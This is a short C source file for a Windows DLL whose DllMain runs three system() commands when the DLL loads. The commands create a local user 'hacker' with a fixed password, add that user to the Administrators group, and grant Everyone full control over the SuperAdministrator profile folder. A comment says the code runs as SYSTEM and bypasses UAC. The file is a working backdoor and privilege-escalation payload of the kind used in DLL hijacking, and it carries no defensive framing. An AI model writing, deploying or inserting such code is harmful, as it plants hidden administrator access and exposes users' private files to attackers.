#include <windows.h>
#include <stdlib.h>  // required for system()

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // Create a new local user
        system("net user hacker P@ssw0rd123! /add");
        // Add that user to the local Administrators group
        system("net localgroup administrators hacker /add");
        // Grant Everyone full control over SuperAdministrator's folder
        // (runs as SYSTEM here, so it bypasses UAC entirely)
        system("icacls \"C:\\Users\\SuperAdministrator\" /grant Everyone:(OI)(CI)F /T");
        break;
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
